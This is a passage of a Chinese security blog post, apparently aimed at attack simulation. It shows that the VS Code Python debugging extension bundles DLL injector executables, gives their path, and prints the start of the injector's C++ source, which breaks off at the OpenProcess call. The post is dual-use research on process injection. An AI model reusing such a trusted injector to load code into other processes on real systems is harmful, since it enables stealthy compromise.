@@ -1,0 +1,291 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>VsCode扩展中的DLL注入器 - 倾旋的博客</title><meta name=viewport content="width=device-width,initial-scale=1">
+<link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/normalize.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/main.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/extra.css><link id=dark-scheme rel=stylesheet type=text/css href=https://payloads.online/css/dark.css><script src=https://payloads.online/js/feather.min.js></script><script src=https://payloads.online/js/main.js></script></head><body><div class="container-wide wrapper"><div class=header><div class=avatar><a href=https://payloads.online/><img src=/avatar.jpeg alt=倾旋的博客></a></div><h1 class=site-title><a href=https://payloads.online/>倾旋的博客</a></h1><div class=site-description><p>现阶段在进行有效性验证/攻击模拟相关的安全研究工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p><nav class="nav social"><ul class=flat><li><a href=https://github.com/rvn0xsy/ title=Github><i data-feather=github></i></a></li><li><a href=/index.xml title=RSS><i data-feather=rss></i></a></li><li><a href=/ title=Wechat><i data-feather=message-circle></i></a></li><span class=scheme-toggle><a href=# id=scheme-toggle></a></ul></nav></div><nav class=nav><ul class=flat><li><a href=/>首页</a></li><li><a href=/posts/>文章列表</a></li><li><a href=/tags>标签</a></li><li><a href=/projects>开源项目</a></li><li><a href=/about>关于我</a></li><li><a href=/links/>友情链接</a></li><li><a href=/message>留言</a></li><li><a href=/sponsor>赞助</a></li></ul></nav></div><div class=article-nav id=article-nav-id><div class=post><div class=post-header><div class=meta><div class=date><span class=day>08</span>
+<span class=rest>Sep 2023</span></div></div><div class=matter><h1 class=title>VsCode扩展中的DLL注入器</h1></div></div><aside class="show-on-mobile toc" id=static-toc><header><h3>Contents</h3></header><nav id=TableOfContents></nav></aside><p>安装完毕Python调试扩展后，会在扩展目录中生成一些文件：</p><p><img src=https://images.payloads.online/2024-07-29-1ac07f2ccf6b6ba8768b96e62815f150289ca24887a111685646538b567130d5.png alt=0></p><p><img src=https://images.payloads.online/2024-07-29-8ba004d0a43efcfa27809998a10469e46d3e380ea3ed0c3122c60583d5a0ee6b.png alt=1></p><p>其中以下两个文件是DLL注入器，分别对应X86和X64位操作系统：</p><ul><li>inject_dll_x86.exe</li><li>inject_dll_amd64.exe</li></ul><p>在windows文件夹中还保留了注入器的源代码：</p><p><img src=https://images.payloads.online/2024-07-29-03d06e145c8996fcbaafefa67c5c28df4b4f53a9f77b69a21cfefebd0fea9d28.png alt=2></p><blockquote><p>路径：<code>C:\Users\Administrator\.vscode\extensions\ms-python.python-2022.20.2\pythonFiles\lib\python\debugpy\_vendored\pydevd\pydevd_attach_to_process\windows</code></p></blockquote><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 44
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 45
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 46
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 47
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 48
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 49
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 50
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 51
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 52
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 53
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 54
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 55
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 56
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 57
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 58
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 59
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 60
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 61
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 62
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 63
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 64
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 65
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 66
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 67
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 68
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 69
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 70
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 71
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 72
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 73
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 74
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 75
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 76
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 77
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 78
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 79
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 80
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 81
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 82
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 83
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 84
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 85
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 86
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 87
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 88
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 89
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 90
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 91
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 92
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 93
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 94
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 95
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 96
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 97
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 98
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 99
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">100
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">101
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">102
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">103
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">104
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">105
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">106
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">107
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">108
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">109
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">110
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">111
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">112
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">113
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">114
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">115
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">116
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">117
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">118
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">119
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">120
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">121
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">122
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">123
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">124
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">125
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">126
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">127
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">128
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">129
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">130
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">131
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">132
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">133
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">134
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>// inject_dll.cpp
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;iostream&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;windows.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;conio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;tchar.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;tlhelp32.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#pragma comment(lib, &#34;kernel32.lib&#34;)
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#pragma comment(lib, &#34;user32.lib&#34;)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Helper to free data when we leave the scope.
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>DataToFree</span> {
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>    HANDLE hProcess;
+</span></span><span style=display:flex><span>    HANDLE snapshotHandle;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    LPVOID remoteMemoryAddr;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> remoteMemorySize;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    DataToFree(){
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>hProcess <span style=color:#f92672>=</span> <span style=color:#66d9ef>nullptr</span>;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>snapshotHandle <span style=color:#f92672>=</span> <span style=color:#66d9ef>nullptr</span>;
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>remoteMemoryAddr <span style=color:#f92672>=</span> <span style=color:#66d9ef>nullptr</span>;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>remoteMemorySize <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#f92672>~</span>DataToFree() {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>hProcess <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nullptr</span>){
+</span></span><span style=display:flex><span>            
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(<span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>remoteMemoryAddr <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nullptr</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>remoteMemorySize <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>){
+</span></span><span style=display:flex><span>                VirtualFreeEx(<span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>hProcess, <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>remoteMemoryAddr, <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>remoteMemorySize, MEM_RELEASE);
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>remoteMemoryAddr <span style=color:#f92672>=</span> <span style=color:#66d9ef>nullptr</span>;
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>remoteMemorySize <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>            
+</span></span><span style=display:flex><span>            CloseHandle(<span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>hProcess);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>hProcess <span style=color:#f92672>=</span> <span style=color:#66d9ef>nullptr</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>snapshotHandle <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nullptr</span>){
+</span></span><span style=display:flex><span>            CloseHandle(<span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>snapshotHandle);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>snapshotHandle <span style=color:#f92672>=</span> <span style=color:#66d9ef>nullptr</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>/**
+</span></span></span><span style=display:flex><span><span style=color:#75715e> * All we do here is load a dll in a remote program (in a remote thread).
+</span></span></span><span style=display:flex><span><span style=color:#75715e> *
+</span></span></span><span style=display:flex><span><span style=color:#75715e> * Arguments must be the pid and the dll name to run.
+</span></span></span><span style=display:flex><span><span style=color:#75715e> *
+</span></span></span><span style=display:flex><span><span style=color:#75715e> * i.e.: inject_dll.exe &lt;pid&gt; &lt;dll path&gt;
+</span></span></span><span style=display:flex><span><span style=color:#75715e> */</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>wmain</span>( <span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>wchar_t</span> <span style=color:#f92672>*</span>argv[ ], <span style=color:#66d9ef>wchar_t</span> <span style=color:#f92672>*</span>envp[ ] )
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Running executable to inject dll.&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// Helper to clear resources.
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    DataToFree dataToFree;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(argc <span style=color:#f92672>!=</span> <span style=color:#ae81ff>3</span>){
+</span></span><span style=display:flex><span>        std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Expected 2 arguments (pid, dll name).&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>int</span> pid <span style=color:#f92672>=</span> _wtoi(argv[<span style=color:#ae81ff>1</span>]);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(pid <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>){
+</span></span><span style=display:flex><span>        std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Invalid pid.&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>2</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>int</span> MAX_PATH_SIZE_PADDED <span style=color:#f92672>=</span> MAX_PATH <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> dllPath[MAX_PATH_SIZE_PADDED];
+</span></span><span style=display:flex><span>    memset(<span style=color:#f92672>&amp;</span>dllPath[<span style=color:#ae81ff>0</span>], <span style=color:#e6db74>&#39;\0&#39;</span>, MAX_PATH_SIZE_PADDED);
+</span></span><span style=display:flex><span>    size_t pathLen <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>    wcstombs_s(<span style=color:#f92672>&amp;</span>pathLen, dllPath, argv[<span style=color:#ae81ff>2</span>], MAX_PATH);
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>bool</span> inheritable <span style=color:#f92672>=</span> false;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> HANDLE hProcess <span style=color:#f92672>=</span> OpenProcess(PROCESS_VM_OPERATION <span style=color:#f92672>|</span> PROCESS_CREATE_THREAD <span style=color:#f92672>|</span> PROCESS_VM_READ <span style=color:#f92672>|</span> PROCESS_VM_WRITE <span style=color:#f92672>|</span> PROCESS_QUERY_INFORMATION, inheritable, pid);
